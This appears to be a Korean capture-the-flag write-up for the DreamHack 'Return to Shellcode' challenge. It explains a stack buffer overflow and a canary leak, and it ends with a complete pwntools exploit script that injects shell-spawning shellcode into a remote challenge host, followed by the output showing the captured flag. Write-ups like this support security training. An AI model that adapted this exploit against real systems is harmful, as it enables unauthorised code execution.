# [DreamHack] Return to Shellcode

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Return to Shellcode에서 실습하는 문제입니다.
>
> Release: [Return to Shellcode.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8546948/Return.to.Shellcode.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159587296-37b7ac13-fe0d-4558-9f53-e5e4694f09ad.png)

## Analysis

```c
int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

스택에 실행 권한이 있고, `read(0, buf, 0x100)`와 `gets(buf)`에서 각각 BOF가 발생한다. 첫 번째 BOF로 canary를 leak할 수 있고, 두 번째 BOF로 `buf`에 셸코드를 저장해놓고 `main()`의 return address를 `buf`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

### Leak Canary

Canary 이전까지를 모두 0 없이 채우면 `buf`의 내용이 출력될 때 canary가 같이 leak되어 나오게 된다.

```python
# leak canary
r.sendafter('Input: ', 'a' * 0x59)
r.recvuntil('Your input is \'' + 'a' * 0x59)
canary = u64(r.recvn(7).rjust(8, b'\x00'))
```

### Return to Shellcode

`buf`에 셸코드를 넣고, `main()`의 return address를 `buf`의 주소로 덮는다.

```python
# return to shellcode
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x58, b'a')
payload += p64(canary) # canary
payload += b'a' * 0x8 # sfp
payload += p64(buf) # return address
r.sendlineafter('Input: ', payload)
```

### Full Exploit

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/r2s')
else:
    r = remote('host2.dreamhack.games', 15215)

r.recvuntil('Address of the buf: 0x')
buf = int(r.recvline()[:-1], 16)

# leak canary
r.sendafter('Input: ', 'a' * 0x59)
r.recvuntil('Your input is \'' + 'a' * 0x59)
canary = u64(r.recvn(7).rjust(8, b'\x00'))

# return to shellcode
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x58, b'a')
payload += p64(canary) # canary
payload += b'a' * 0x8 # sfp
payload += p64(buf) # return address
r.sendlineafter('Input: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host2.dreamhack.games on port 15215: Done
[*] Switching to interactive mode
$ cat flag
DH{333eb89c9d2615dd8942ece08c1d34d5}
```